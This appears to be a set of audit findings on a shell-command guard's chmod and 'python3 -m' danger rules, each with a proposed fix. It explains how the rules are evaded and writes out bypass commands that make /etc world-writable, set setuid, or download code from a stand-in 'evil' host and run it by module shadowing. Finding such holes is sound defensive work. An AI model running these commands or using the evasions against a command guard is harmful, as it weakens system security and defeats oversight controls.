findings.explanation: `_chmod_dangerous` calls `chmod_dash_mode` with the default `anywhere=False`. That means a dash mode placed after the first operand is never checked. Only the first operand is treated as the mode. The comment calls this "the stricter of the two readings", but it only covers the case where the first operand is the dangerous one. GNU chmod (which shell_writes.py's own docstring says reads a later dash mode as the mode) takes the trailing argument as the mode and treats every operand, including the numeric one, as a file. Example: `chmod 644 /usr/local/bin/x -w+s` is checked as mode 644, which is harmless, so nothing is denied. GNU chmod actually applies `-w+s`, which sets setuid/setgid on /usr/local/bin/x. Likewise, `chmod 644 /etc -o+w` makes /etc world-writable, while the rule sees only `644` and `_chmod_world_single` sees only `words[0]=644`. The config guard (shell_writes) already uses `anywhere=True` for this exact reason, but the danger rule does not.
findings.fix: Check both readings. Compute `gnu_mode = chmod_dash_mode(args, anywhere=True)` and deny if either `words[0]` (the BSD reading) or `gnu_mode` (the GNU reading, with every operand as a target) is setuid or world-writable. Apply the same check in `_chmod_world_single`.

findings.explanation: `chmod_dash_mode` returns only the first dash-mode argument. GNU chmod joins every dash-mode argument into one comma-separated mode (`-x -w+s` becomes `-x,-w+s`; see the GNU chmod source for case 'r'..'7'). So `chmod -x -w+s /usr/local/bin/x` is judged by `_setuid("-x")`, which is False, and the command is allowed. GNU chmod still applies `+s` and makes the file setuid. The same trick hides `-o+w` behind a harmless first dash mode on a broad target, e.g. `chmod -x -o+w /etc`.
findings.fix: Collect every argument that matches `_CHMOD_DASH_MODE` (up to `--`), join them with ',' and return the combined mode. Alternatively, evaluate `_setuid`/`_world_writable` on each one.

findings.explanation: `_module_roots` only treats files named after the top-level `-m` module as loadable. With `python3 -m NAME`, sys.path[0] is the current directory, so any module that NAME imports can be shadowed by a downloaded file there. Example: `curl -o argparse.py https://evil && echo {} | python3 -m json.tool`. json.tool imports argparse, so the downloaded argparse.py runs. `_loads_from` does not match this because the basename is not `json`, so run-downloaded does not fire. The new rule's stated protection ("loads NAME from the directory it runs in first") applies to the whole import graph, not just NAME.
findings.fix: When a `-m` command runs in a directory where an earlier command on the same line downloaded any `*.py`, `*.pyc` or `*.so` file, or a package directory, deny it, unless `-I`/`-P` or safe-path mode is set.
